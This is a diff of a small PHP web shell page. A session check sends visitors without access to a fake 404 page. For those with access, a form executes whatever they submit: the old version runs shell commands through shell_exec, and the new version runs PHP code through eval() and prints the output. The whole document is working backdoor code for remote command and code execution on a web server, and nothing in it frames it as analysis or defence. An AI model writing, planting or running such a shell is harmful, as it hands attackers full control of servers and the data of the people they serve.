@@ -1,4 +1,4 @@
- <?php
+<?php
 session_start();
 if($_SESSION['status']!="1"){
 	header("Location: /404.php");
@@ -15,7 +15,7 @@ if($_SESSION['status']!="1"){
     <a href="options.php">Home</a><hr>
 
     <form action="" name="query" id="query" method="post">
-    	SHELL: &nbsp;&nbsp;&ensp;&nbsp;&nbsp;<input type="text" id="query_box" name="query_box" placeholder="Ex: whoami"></input><br><br>   
+    	PHP: &nbsp;&nbsp;&ensp;&nbsp;&nbsp;<input type="text" id="query_box" name="query_box" placeholder='echo "Hello, World!";'></input><br><br>   
     	<button type="Submit" value="Submit">Submit</button>
     </form>
 <?php
@@ -24,7 +24,7 @@ echo "<br>Current directory: $cwd<br>";
 $shell = $_POST['query_box'];
 if (!empty($_POST['query_box'])) {
 	//Run the shell command
-	$run = shell_exec("$shell");
+	$run = eval($shell);
 	echo "<br><b>Output: </b><br>";
 	echo "<pre>$run</pre>";
 }else{
